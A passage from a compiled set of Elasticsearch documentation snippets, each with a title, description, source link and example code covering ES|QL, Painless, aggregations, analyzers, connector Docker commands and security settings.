1;\n--x;\n```\n\n----------------------------------------\n\nTITLE: Calculating Hyperbolic Cosine using COSH in ESQL\nDESCRIPTION: Demonstrates how to use the COSH function to calculate the hyperbolic cosine of a numeric value. The example creates a row with value 1.8 and applies the COSH function to compute its hyperbolic cosine.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/kibana/docs/functions/cosh.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nROW a=1.8\n| EVAL cosh=COSH(a)\n```\n\n----------------------------------------\n\nTITLE: EQL Query for Specific Process\nDESCRIPTION: Shows an EQL query that matches events with an event category of 'process' and a process name of 'svchost.exe'.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/eql/eql-syntax.md#2025-04-21_snippet_1\n\nLANGUAGE: eql\nCODE:\n```\nprocess where process.name == \"svchost.exe\"\n```\n\n----------------------------------------\n\nTITLE: Running Salesforce Connector Docker Image\nDESCRIPTION: Docker command to run the Elastic connectors service with the configuration file, using volume mapping and network settings.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/search-connectors/es-connectors-salesforce.md#2025-04-21_snippet_4\n\nLANGUAGE: sh\nCODE:\n```\ndocker run \\\n-v ~/connectors-config:/config \\\n--network \"elastic\" \\\n--tty \\\n--rm \\\ndocker.elastic.co/integrations/elastic-connectors:9.0.0 \\\n/app/bin/elastic-ingest \\\n-c /config/config.yml\n```\n\n----------------------------------------\n\nTITLE: Running Elasticsearch Connector Docker Image\nDESCRIPTION: Executes a Docker command to run the Elasticsearch connectors image. It mounts a local configuration directory, sets network parameters, and specifies the command to initiate the connector service using a predefined configuration file.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/search-connectors/es-connectors-confluence.md#2025-04-21_snippet_5\n\nLANGUAGE: shell\nCODE:\n```\ndocker run \\\n-v ~/connectors-config:/config \\\n--network \"elastic\" \\\n--tty \\\n--rm \\\ndocker.elastic.co/integrations/elastic-connectors:9.0.0 \\\n/app/bin/elastic-ingest \\\n-c /config/config.yml\n```\n\n----------------------------------------\n\nTITLE: Performing Sum Aggregation on Histogram Field in Elasticsearch\nDESCRIPTION: This snippet demonstrates how to perform a sum aggregation on a histogram field, calculating the total latency across all networks.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-metrics-sum-aggregation.md#2025-04-21_snippet_5\n\nLANGUAGE: console\nCODE:\n```\nPOST /metrics_index/_search?size=0&filter_path=aggregations\n{\n  \"aggs\" : {\n    \"total_latency\" : { \"sum\" : { \"field\" : \"latency_histo\" } }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Augmenting String with Cryptographic Hashing Methods\nDESCRIPTION: Adds SHA-1, SHA-256, and SHA-512 cryptographic hash methods to Java String class for use in Elasticsearch scripts\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/lang-painless/src/main/resources/org/elasticsearch/painless/org.elasticsearch.script.update_by_query.txt#2025-04-21_snippet_0\n\nLANGUAGE: java\nCODE:\n```\nclass java.lang.String {\n  String org.elasticsearch.painless.api.Augmentation sha1()\n  String org.elasticsearch.painless.api.Augmentation sha256()\n  String org.elasticsearch.painless.api.Augmentation sha512()\n}\n```\n\n----------------------------------------\n\nTITLE: Analyzing annotated text in Elasticsearch\nDESCRIPTION: Uses the _analyze API to demonstrate how annotated text is tokenized, including both text and annotation tokens.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch-plugins/mapper-annotated-text-usage.md#2025-04-21_snippet_1\n\nLANGUAGE: js\nCODE:\n```\nGET my-index-000001/_analyze\n{\n  \"field\": \"my_field\",\n  \"text\":\"Investors in [Apple](Apple+Inc.) rejoiced.\"\n}\n```\n\nLANGUAGE: js\nCODE:\n```\n{\n  \"tokens\": [\n    {\n      \"token\": \"investors\",\n      \"start_offset\": 0,\n      \"end_offset\": 9,\n      \"type\": \"<ALPHANUM>\",\n      \"position\": 0\n    },\n    {\n      \"token\": \"in\",\n      \"start_offset\": 10,\n      \"end_offset\": 12,\n      \"type\": \"<ALPHANUM>\",\n      \"position\": 1\n    },\n    {\n      \"token\": \"Apple Inc.\",\n      \"start_offset\": 13,\n      \"end_offset\": 18,\n      \"type\": \"annotation\",\n      \"position\": 2\n    },\n    {\n      \"token\": \"apple\",\n      \"start_offset\": 13,\n      \"end_offset\": 18,\n      \"type\": \"<ALPHANUM>\",\n      \"position\": 2\n    },\n    {\n      \"token\": \"rejoiced\",\n      \"start_offset\": 19,\n      \"end_offset\": 27,\n      \"type\": \"<ALPHANUM>\",\n      \"position\": 3\n    }\n  ]\n}\n```\n\n----------------------------------------\n\nTITLE: Complete Example of K-S Test for Comparing Latency Distributions by Version\nDESCRIPTION: A comprehensive example showing how to execute a bucket_count_ks_test on terms aggregation results. This example tests if latency distributions across different software versions follow a uniform distribution by using range buckets based on latency percentiles.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-bucket-count-ks-test-aggregation.md#2025-04-21_snippet_1\n\nLANGUAGE: console\nCODE:\n```\nPOST correlate_latency/_search?size=0&filter_path=aggregations\n{\n  \"aggs\": {\n    \"buckets\": {\n      \"terms\": { <1>\n        \"field\": \"version\",\n        \"size\": 2\n      },\n      \"aggs\": {\n        \"latency_ranges\": {\n          \"range\": { <2>\n            \"field\": \"latency\",\n            \"ranges\": [\n              { \"to\": 0 },\n              { \"from\": 0, \"to\": 105 },\n              { \"from\": 105, \"to\": 225 },\n              { \"from\": 225, \"to\": 445 },\n              { \"from\": 445, \"to\": 665 },\n              { \"from\": 665, \"to\": 885 },\n              { \"from\": 885, \"to\": 1115 },\n              { \"from\": 1115, \"to\": 1335 },\n              { \"from\": 1335, \"to\": 1555 },\n              { \"from\": 1555, \"to\": 1775 },\n              { \"from\": 1775 }\n            ]\n          }\n        },\n        \"ks_test\": { <3>\n          \"bucket_count_ks_test\": {\n            \"buckets_path\": \"latency_ranges>_count\",\n            \"alternative\": [\"less\", \"greater\", \"two_sided\"]\n          }\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring SMTP SSL Trust in Elasticsearch YAML\nDESCRIPTION: Specifies SMTP server hosts that are trusted and for which certificate verification is disabled. Use \"*\" to trust all hosts.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/configuration-reference/watcher-settings.md#2025-04-21_snippet_16\n\nLANGUAGE: yaml\nCODE:\n```\nsmtp.ssl.trust\n```\n\n----------------------------------------\n\nTITLE: Example Warning Log Message\nDESCRIPTION: This warning message indicates that the health check to the data extraction service resulted in a timeout or connection error.  A timeout may be due to the extraction service not running or being inaccessible, while a server connection error is an internal issue requiring log investigation.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/search-connectors/es-connectors-content-extraction.md#2025-04-21_snippet_13\n\nLANGUAGE: bash\nCODE:\n```\nExpected to find a running instance of data extraction service at <HOST> but failed. <ERROR>.\n```\n\n----------------------------------------\n\nTITLE: Demonstrating Boolean Not Operator in Painless\nDESCRIPTION: Examples showing the use of the boolean not operator '!' with boolean and def types. Includes type casting and variable assignment.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/painless-operators-boolean.md#2025-04-21_snippet_0\n\nLANGUAGE: painless\nCODE:\n```\nboolean x = !false;\nboolean y = !x;\n```\n\nLANGUAGE: painless\nCODE:\n```\ndef y = true;\ndef z = !y;\n```\n\n----------------------------------------\n\nTITLE: Indexing a Question Document for Parent Aggregation Example\nDESCRIPTION: Creates a parent document of type \"question\" with tags that will be used in the parent aggregation example.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-bucket-parent-aggregation.md#2025-04-21_snippet_1\n\nLANGUAGE: console\nCODE:\n```\nPUT parent_example/_doc/1\n{\n  \"join\": {\n    \"name\": \"question\"\n  },\n  \"body\": \"<p>I have Windows 2003 server and i bought a new Windows 2008 server...\",\n  \"title\": \"Whats the best way to file transfer my site from server to a newer one?\",\n  \"tags\": [\n    \"windows-server-2003\",\n    \"windows-server-2008\",\n    \"file-transfer\"\n  ]\n}\n```\n\n----------------------------------------\n\nTITLE: Defining ZoneRules Class Methods\nDESCRIPTION: Defines the structure and methods of the ZoneRules class for managing time zone rules. Includes methods for handling daylight savings, offsets, and transitions.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/lang-painless/src/main/resources/org/elasticsearch/painless/java.time.zone.txt#2025-04-21_snippet_2\n\nLANGUAGE: java\nCODE:\n```\nclass java.time.zone.ZoneRules {\n  Duration getDaylightSavings(Instant)\n  ZoneOffset getOffset(Instant)\n  ZoneOffset getStandardOffset(Instant)\n  ZoneOffsetTransition getTransition(LocalDateTime)\n  List getTransitionRules()\n  List getTransitions()\n  List getValidOffsets(LocalDateTime)\n  boolean isDaylightSavings(Instant)\n  boolean isFixedOffset()\n  boolean isValidOffset(LocalDateTime,ZoneOffset)\n  ZoneOffsetTransition nextTransition(Instant)\n  ZoneRules of(ZoneOffset)\n  ZoneRules of(ZoneOffset,ZoneOffset,List,List,List)\n  ZoneOffsetTransition previousTransition(Instant)\n}\n```\n\n----------------------------------------\n\nTITLE: Creating Password-Protected Certificate PEM - cert2 with Elasticsearch Certutil\nDESCRIPTION: This snippet creates a second certificate PEM file named 'cert2', similar to cert1 but includes a password for additional security.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/libs/ssl-config/src/test/resources/certs/README.txt#2025-04-21_snippet_4\n\nLANGUAGE: bash\nCODE:\n```\n# 5. Create \"cert2\" PEM (same as cert1, but with a password)\nelasticsearch-certutil cert --pem --out cert2.zip --name cert2 --ip 127.0.0.1 --dns localhost --days 9999 --ca-key ca1/ca.key --ca-cert ca1/ca.crt --pass \"c2-pass\"\nunzip cert2.zip\n```\n\n----------------------------------------\n\nTITLE: Removing Phonetic Analysis Plugin from Elasticsearch\nDESCRIPTION: This command removes the Phonetic Analysis plugin from Elasticsearch. The node must be stopped before removing the plugin.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch-plugins/analysis-phonetic.md#2025-04-21_snippet_1\n\nLANGUAGE: sh\nCODE:\n```\nsudo bin/elasticsearch-plugin remove analysis-phonetic\n```\n\n----------------------------------------\n\nTITLE: Defining Custom Sorani Analyzer in Elasticsearch\nDESCRIPTION: This snippet configures a custom analyzer for the Sorani language using Elasticsearch. It employs specific filters for normalization, stemming, and keyword marking. Dependencies include Elasticsearch with necessary plugins. The input is Sorani language text and the output is normalized tokens suitable for search.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-lang-analyzer.md#2025-04-21_snippet_25\n\nLANGUAGE: console\nCODE:\n```\nPUT /sorani_example\n{\n  \"settings\": {\n    \"analysis\": {\n      \"filter\": {\n        \"sorani_stop\": {\n          \"type\":       \"stop\",\n          \"stopwords\":  \"_sorani_\" <1>\n        },\n        \"sorani_keywords\": {\n          \"type\":       \"keyword_marker\",\n          \"keywords\":   [\"mînak\"] <2>\n        },\n        \"sorani_stemmer\": {\n          \"type\":       \"stemmer\",\n          \"language\":   \"sorani\"\n        }\n      },\n      \"analyzer\": {\n        \"rebuilt_sorani\": {\n          \"tokenizer\":  \"standard\",\n          \"filter\": [\n            \"sorani_normalization\",\n            \"lowercase\",\n            \"decimal_digit\",\n            \"sorani_stop\",\n            \"sorani_keywords\",\n            \"sorani_stemmer\"\n          ]\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Asterisk Operator Examples in Regular Expressions\nDESCRIPTION: Examples showing the asterisk operator which matches zero or more occurrences of the preceding character.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/regexp-syntax.md#2025-04-21_snippet_6\n\nLANGUAGE: text\nCODE:\n```\nab*     # matches 'a', 'ab', 'abb', 'abbb', etc.\n```\n\n----------------------------------------\n\nTITLE: Running PostgreSQL in Docker\nDESCRIPTION: Docker command to start a PostgreSQL instance with a custom user and password, exposing it on port 5432.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/search-connectors/api-tutorial.md#2025-04-21_snippet_4\n\nLANGUAGE: bash\nCODE:\n```\ndocker run --name postgres -e POSTGRES_USER=myuser -e POSTGRES_PASSWORD=mypassword -p 5432:5432 -d postgres\n```\n\n----------------------------------------\n\nTITLE: Assigning Site Permissions using Graph API\nDESCRIPTION: This HTTP POST request assigns read or write access to a specific SharePoint site for an application. It uses the site ID obtained from the previous query and specifies the roles and application details in the request body.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/search-connectors/es-connectors-sharepoint-online.md#2025-04-22_snippet_4\n\nLANGUAGE: http\nCODE:\n```\nPOST https://graph.microsoft.com/v1.0/sites/<siteId>/permissions\n{\n    \"roles\": [\"read\"], // or \"write\"\n    \"grantedToIdentities\": [\n        {\n            \"application\": {\n                \"id\": \"<App_Client_ID>\",\n                \"displayName\": \"<App_Display_Name>\"\n            }\n        }\n    ]\n}\n```\n\n----------------------------------------\n\nTITLE: Advanced Weighted Tokens Query with Pruning and Rescore\nDESCRIPTION: An advanced example demonstrating weighted tokens query with pruning configuration and rescore functionality to mitigate shard-level inconsistency with pruned tokens and improve relevance in multi-shard environments.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/query-dsl-weighted-tokens-query.md#2025-04-21_snippet_1\n\nLANGUAGE: json\nCODE:\n```\nGET my-index/_search\n{\n   \"query\":{\n      \"weighted_tokens\": {\n      \"query_expansion_field\": {\n        \"tokens\": {\"2161\": 0.4679, \"2621\": 0.307, \"2782\": 0.1299, \"2851\": 0.1056, \"3088\": 0.3041, \"3376\": 0.1038, \"3467\": 0.4873, \"3684\": 0.8958, \"4380\": 0.334, \"4542\": 0.4636, \"4633\": 2.2805, \"4785\": 1.2628, \"4860\": 1.0655, \"5133\": 1.0709, \"7139\": 1.0016, \"7224\": 0.2486, \"7387\": 0.0985, \"7394\": 0.0542, \"8915\": 0.369, \"9156\": 2.8947, \"10505\": 0.2771, \"11464\": 0.3996, \"13525\": 0.0088, \"14178\": 0.8161, \"16893\": 0.1376, \"17851\": 1.5348, \"19939\": 0.6012},\n        \"pruning_config\": {\n          \"tokens_freq_ratio_threshold\": 5,\n          \"tokens_weight_threshold\": 0.4,\n          \"only_score_pruned_tokens\": false\n        }\n      }\n    }\n   },\n   \"rescore\": {\n      \"window_size\": 100,\n      \"query\": {\n         \"rescore_query\": {\n            \"weighted_tokens\": {\n              \"query_expansion_field\": {\n                \"tokens\": {\"2161\": 0.4679, \"2621\": 0.307, \"2782\": 0.1299, \"2851\": 0.1056, \"3088\": 0.3041, \"3376\": 0.1038, \"3467\": 0.4873, \"3684\": 0.8958, \"4380\": 0.334, \"4542\": 0.4636, \"4633\": 2.2805, \"4785\": 1.2628, \"4860\": 1.0655, \"5133\": 1.0709, \"7139\": 1.0016, \"7224\": 0.2486, \"7387\": 0.0985, \"7394\": 0.0542, \"8915\": 0.369, \"9156\": 2.8947, \"10505\": 0.2771, \"11464\": 0.3996, \"13525\": 0.0088, \"14178\": 0.8161, \"16893\": 0.1376, \"17851\": 1.5348, \"19939\": 0.6012},\n                \"pruning_config\": {\n                  \"tokens_freq_ratio_threshold\": 5,\n                  \"tokens_weight_threshold\": 0.4,\n                  \"only_score_pruned_tokens\": true\n                }\n              }\n            }\n         }\n      }\n   }\n}\n```\n\n----------------------------------------\n\nTITLE: Date Histogram Aggregation with 19-Day Offset\nDESCRIPTION: Example response showing date histogram buckets with a 19-day offset across different months in 2022.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-bucket-datehistogram-aggregation.md#2025-04-21_snippet_10\n\nLANGUAGE: console\nCODE:\n```\n\"buckets\": [\n  { \"key_as_string\": \"2022-01-20\", \"key\": 1642636800000, \"doc_count\": 1 },\n  { \"key_as_string\": \"2022-02-20\", \"key\": 1645315200000, \"doc_count\": 1 },\n  { \"key_as_string\": \"2022-03-20\", \"key\": 1647734400000, \"doc_count\": 1 },\n  { \"key_as_string\": \"2022-04-20\", \"key\": 1650412800000, \"doc_count\": 1 },\n  { \"key_as_string\": \"2022-05-20\", \"key\": 1653004800000, \"doc_count\": 1 },\n  { \"key_as_string\": \"2022-06-20\", \"key\": 1655683200000, \"doc_count\": 1 },\n  { \"key_as_string\": \"2022-07-20\", \"key\": 1658275200000, \"doc_count\": 1 },\n  { \"key_as_string\": \"2022-08-20\", \"key\": 1660953600000, \"doc_count\": 1 }\n]\n```\n\n----------------------------------------\n\nTITLE: Creating Indices with Different Date Types for Sorting in Elasticsearch\nDESCRIPTION: Defines two indices with different date types (date and date_nanos) to demonstrate date resolution conversion in sorting.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/rest-apis/sort-search-results.md#2025-04-21_snippet_6\n\nLANGUAGE: console\nCODE:\n```\nPUT /index_double\n{\n  \"mappings\": {\n    \"properties\": {\n      \"field\": { \"type\": \"date\" }\n    }\n  }\n}\n```\n\nLANGUAGE: console\nCODE:\n```\nPUT /index_long\n{\n  \"mappings\": {\n    \"properties\": {\n      \"field\": { \"type\": \"date_nanos\" }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Displaying Supported Types Table in Markdown\nDESCRIPTION: This markdown table shows the supported field types, query types, options, and result types for an ESQL function. It includes various data types and their compatibility with different query types.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/types/match.md#2025-04-21_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n| field | query | options | result |\n| --- | --- | --- | --- |\n| boolean | boolean | named parameters | boolean |\n| boolean | keyword | named parameters | boolean |\n| date | date | named parameters | boolean |\n| date | keyword | named parameters | boolean |\n| date_nanos | date_nanos | named parameters | boolean |\n| date_nanos | keyword | named parameters | boolean |\n| double | double | named parameters | boolean |\n| double | integer | named parameters | boolean |\n| double | keyword | named parameters | boolean |\n| double | long | named parameters | boolean |\n| integer | double | named parameters | boolean |\n| integer | integer | named parameters | boolean |\n| integer | keyword | named parameters | boolean |\n| integer | long | named parameters | boolean |\n| ip | ip | named parameters | boolean |\n| ip | keyword | named parameters | boolean |\n| keyword | keyword | named parameters | boolean |\n| long | double | named parameters | boolean |\n| long | integer | named parameters | boolean |\n| long | keyword | named parameters | boolean |\n| long | long | named parameters | boolean |\n| text | keyword | named parameters | boolean |\n| unsigned_long | double | named parameters | boolean |\n| unsigned_long | integer | named parameters | boolean |\n| unsigned_long | keyword | named parameters | boolean |\n| unsigned_long | long | named parameters | boolean |\n| unsigned_long | unsigned_long | named parameters | boolean |\n| version | keyword | named parameters | boolean |\n| version | version | named parameters | boolean |\n```\n\n----------------------------------------\n\nTITLE: SAML PEM Key Configuration\nDESCRIPTION: Configuration for using PEM encoded private keys and certificates for SAML message signing as an alternative to keystores.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/configuration-reference/security-settings.md#2025-04-21_snippet_12\n\nLANGUAGE: yaml\nCODE:\n```\nsigning.key: \"path/to/private.key\"\nsigning.secure_key_passphrase: \"${KEY_PASSPHRASE}\"\nsigning.certificate: \"path/to/certificate.pem\"\n```\n\n----------------------------------------\n\nTITLE: Semantic Text Highlighting with Explicit Highlighter Type\nDESCRIPTION: Example of configuring highlighting specifically for semantic_text fields using the semantic highlighter type.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/mapping-reference/semantic-text.md#2025-04-21_snippet_4\n\nLANGUAGE: console\nCODE:\n```\nPUT test-index\n{\n    \"query\": {\n        \"match\": {\n            \"my_field\": \"Which country is Paris in?\"\n        }\n    },\n    \"highlight\": {\n        \"fields\": {\n            \"my_field\": {\n                \"type\": \"semantic\",\n                \"number_of_fragments\": 2,\n                \"order\": \"score\"\n            }\n        }\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Aggregation Path Syntax Definition in EBNF\nDESCRIPTION: EBNF syntax definition for specifying aggregation paths in term ordering.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-bucket-terms-aggregation.md#2025-04-21_snippet_6\n\nLANGUAGE: ebnf\nCODE:\n```\nAGG_SEPARATOR       =  '>' ;\nMETRIC_SEPARATOR    =  '.' ;\nAGG_NAME            =  <the name of the aggregation> ;\nMETRIC              =  <the name of the metric (in case of multi-value metrics aggregation)> ;\nPATH                =  <AGG_NAME> [ <AGG_SEPARATOR>, <AGG_NAME> ]* [ <METRIC_SEPARATOR>, <METRIC> ] ;\n```\n\n----------------------------------------\n\nTITLE: Configuring URL decode processor in Elasticsearch\nDESCRIPTION: This snippet demonstrates how to configure the URL decode processor in an Elasticsearch ingest pipeline. It specifies the field to be decoded using the 'urldecode' operation.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/enrich-processor/urldecode-processor.md#2025-04-21_snippet_0\n\nLANGUAGE: js\nCODE:\n```\n{\n  \"urldecode\": {\n    \"field\": \"my_url_to_decode\"\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Implementing Greater Than Operator in Painless\nDESCRIPTION: Demonstrates the greater than operator '>' with various numeric types and def type. Includes type promotion and implicit casting.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/painless-operators-boolean.md#2025-04-21_snippet_1\n\nLANGUAGE: painless\nCODE:\n```\nboolean x = 5 > 4;\ndouble y = 6.0;\nx = 6 > y;\n```\n\nLANGUAGE: painless\nCODE:\n```\nint x = 5;\ndef y = 7.0;\ndef z = y > 6.5;\ndef a = x > y;\n```\n\n----------------------------------------\n\nTITLE: ESQL Data Type Mapping Table\nDESCRIPTION: A markdown table showing the supported input types (str), pattern types, and result types for ESQL pattern matching operations. Documents that keyword and text types can be matched against keyword patterns to produce boolean results.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/operators/types/like.md#2025-04-21_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n| str | pattern | result |\n| --- | --- | --- |\n| keyword | keyword | boolean |\n| text | keyword | boolean |\n```\n\n----------------------------------------\n\nTITLE: Deleting Elasticsearch User\nDESCRIPTION: Example showing how to delete the user 'jacknich' from the system.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/command-line-tools/users-command.md#2025-04-21_snippet_5\n\nLANGUAGE: shell\nCODE:\n```\nbin/elasticsearch-users userdel jacknich\n```\n\n----------------------------------------\n\nTITLE: Querying Elasticsearch Collector Profile Output\nDESCRIPTION: Example output showing collector hierarchy with QueryPhaseCollector and SimpleTopScoreDocCollector, demonstrating query execution timing and structure.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/rest-apis/search-profile.md#2025-04-21_snippet_5\n\nLANGUAGE: console-result\nCODE:\n```\n\"collector\": [\n  {\n    \"name\": \"QueryPhaseCollector\",\n    \"reason\": \"search_query_phase\",\n    \"time_in_nanos\": 775274,\n    \"children\" : [\n      {\n        \"name\": \"SimpleTopScoreDocCollector\",\n        \"reason\": \"search_top_hits\",\n        \"time_in_nanos\": 775274\n      }\n    ]\n  }\n]\n```\n\n----------------------------------------\n\nTITLE: Computing Weighted Sum with MV PSERIES in ESQL\nDESCRIPTION: This snippet calculates a weighted sum for a row of values using the MV PSERIES WEIGHTED SUM function in ESQL. Dependencies include a defined row input and P-series terms. The key parameter, a, is an array of numerical values, and the snippet outputs the computed sum as a single-valued column. Limitations include that it requires a pre-defined array of floats. The function is typically used in Elasticsearch within data pipelines for value transformations.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/kibana/docs/functions/mv_pseries_weighted_sum.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nROW a = [70.0, 45.0, 21.0, 21.0, 21.0]\n| EVAL sum = MV_PSERIES_WEIGHTED_SUM(a, 1.5)\n| KEEP sum\n```\n\n----------------------------------------\n\nTITLE: Using DOTALL Regex Flag in Painless\nDESCRIPTION: Illustrates the use of the DOTALL (single line) flag 's' in a Painless regex pattern. This allows the dot to match newline characters.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/painless-regexes.md#2025-04-21_snippet_3\n\nLANGUAGE: painless\nCODE:\n```\n'a\\nb\\nc' =~ /.b./s\n```\n\n----------------------------------------\n\nTITLE: Percolate Query Search Request in Elasticsearch\nDESCRIPTION: A search request using the percolate query to find matching percolator queries for a given document. This demonstrates how the optimized term query is used for matching.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/mapping-reference/percolator.md#2025-04-21_snippet_9\n\nLANGUAGE: console\nCODE:\n```\nGET /my_queries1/_search\n{\n  \"query\": {\n    \"percolate\": {\n      \"field\": \"query\",\n      \"document\": {\n        \"my_field\": \"abcd\"\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Analyzing Text with Keyword Tokenizer in Elasticsearch\nDESCRIPTION: This snippet demonstrates using the analyze API with the keyword tokenizer to produce a token containing whitespace. It shows how the token retains the original whitespace without trimming.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-trim-tokenfilter.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nGET _analyze\n{\n  \"tokenizer\" : \"keyword\",\n  \"text\" : \" fox \"\n}\n```\n\n----------------------------------------\n\nTITLE: Remainder Operator in Painless\nDESCRIPTION: Illustrates the remainder operator ('%') in Painless with different numeric types.  The result is the remainder after division. The example shows remainder operations between int and double types.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/painless-operators-numeric.md#2025-04-21_snippet_18\n\nLANGUAGE: painless\nCODE:\n```\nint i = 29%4;     <1>\ndouble d = i%7.0; <2>\n```\n\n----------------------------------------\n\nTITLE: Analyzing Text with Hyphenation Decompounder Filter\nDESCRIPTION: Example of using the analyze API with hyphenation_decompounder filter to decompose the German compound word 'Kaffeetasse' using specified word list and hyphenation patterns.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-hyp-decomp-tokenfilter.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nGET _analyze\n{\n  \"tokenizer\": \"standard\",\n  \"filter\": [\n    {\n      \"type\": \"hyphenation_decompounder\",\n      \"hyphenation_patterns_path\": \"analysis/hyphenation_patterns.xml\",\n      \"word_list\": [\"Kaffee\", \"zucker\", \"tasse\"]\n    }\n  ],\n  \"text\": \"Kaffeetasse\"\n}\n```\n\n----------------------------------------\n\nTITLE: Response Format for Second-Level Collapsing\nDESCRIPTION: Shows the response format when using second-level collapsing, including the nested structure of inner hits that have been further collapsed by a second field.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/rest-apis/collapse-search-results.md#2025-04-21_snippet_7\n\nLANGUAGE: console-result\nCODE:\n```\n{\n  \"hits\" : {\n    \"hits\" : [\n      {\n        \"_index\" : \"my-index-000001\",\n        \"_id\" : \"oX9uXXoB0da05OCR3adK\",\n        \"_score\" : 0.5753642,\n        \"_source\" : {\n          \"@timestamp\" : \"2099-11-15T14:12:12\",\n          \"geo\" : {\n            \"country_name\" : \"Amsterdam\"\n          },\n          \"http\" : {\n            \"request\" : {\n              \"method\" : \"get\"\n            },\n            \"response\" : {\n              \"bytes\" : 1070000,\n              \"status_code\" : 200\n            },\n            \"version\" : \"1.1\"\n          },\n          \"message\" : \"GET /search HTTP/1.1 200 1070000\",\n          \"source\" : {\n            \"ip\" : \"127.0.0.1\"\n          },\n          \"user\" : {\n            \"id\" : \"kimchy\"\n          }\n        },\n        \"fields\" : {\n          \"geo.country_name\" : [\n            \"Amsterdam\"\n          ]\n        },\n        \"inner_hits\" : {\n          \"by_location\" : {\n            \"hits\" : {\n              \"total\" : {\n                \"value\" : 1,\n                \"relation\" : \"eq\"\n              },\n              \"max_score\" : 0.5753642,\n              \"hits\" : [\n                {\n                  \"_index\" : \"my-index-000001\",\n                  \"_id\" : \"oX9uXXoB0da05OCR3adK\",\n                  \"_score\" : 0.5753642,\n                  \"_source\" : {\n                    \"@timestamp\" : \"2099-11-15T14:12:12\",\n                    \"geo\" : {\n                      \"country_name\" : \"Amsterdam\"\n                    },\n                    \"http\" : {\n                      \"request\" : {\n                        \"method\" : \"get\"\n                      },\n                      \"response\" : {\n                        \"bytes\" : 1070000,\n                        \"status_code\" : 200\n                      },\n                      \"version\" : \"1.1\"\n                    },\n                    \"message\" : \"GET /search HTTP/1.1 200 1070000\",\n                    \"source\" : {\n                      \"ip\" : \"127.0.0.1\"\n                    },\n                    \"user\" : {\n                      \"id\" : \"kimchy\"\n                    }\n                  },\n                  \"fields\" : {\n                    \"user.id\" : [\n                      \"kimchy\"\n                    ]\n                  }\n                }\n              ]\n            }\n          }\n        }\n      }\n    ]\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Indexing geo_shape data in Elasticsearch\nDESCRIPTION: This snippet demonstrates how to index documents with `geo_shape` fields in Elasticsearch. It defines a mapping with a nested `pin.location` property of type `geo_shape` and then indexes a document with a polygon geo shape using coordinates.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/query-dsl-geo-distance-query.md#2025-04-21_snippet_1\n\nLANGUAGE: console\nCODE:\n```\nPUT /my_geoshapes\n{\n  \"mappings\": {\n    \"properties\": {\n      \"pin\": {\n        \"properties\": {\n          \"location\": {\n            \"type\": \"geo_shape\"\n          }\n        }\n    